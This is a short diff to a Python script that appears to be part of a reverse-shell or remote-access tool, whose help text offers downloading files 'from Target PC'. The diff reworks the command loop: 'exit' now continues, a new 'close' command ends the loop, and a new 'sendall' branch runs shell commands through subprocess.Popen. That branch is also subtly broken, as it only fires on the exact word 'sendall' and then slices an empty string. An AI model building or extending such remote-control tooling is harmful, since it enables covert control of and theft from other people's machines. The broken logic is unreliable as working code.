@@ -1,6 +1,6 @@
 #/usr/bin/python
 # Written By: Sahar Hathiramani
-# Date: 01/21/2021 - 1/23/2021
+# Date: 01/21/2021 - 1/24/2021
 
 import socket
 from termcolor import colored
@@ -64,7 +64,13 @@ def shell():
     while True:
         command = reliable_recv()
         if command == 'exit':
+            continue
+
+        elif command == "close":
             break
+
+        elif command == "sendall":
+            subprocess.Popen(command[8:], shell=True)
 
         elif command == "help":
             options = '''download path --> Download File from Target PC
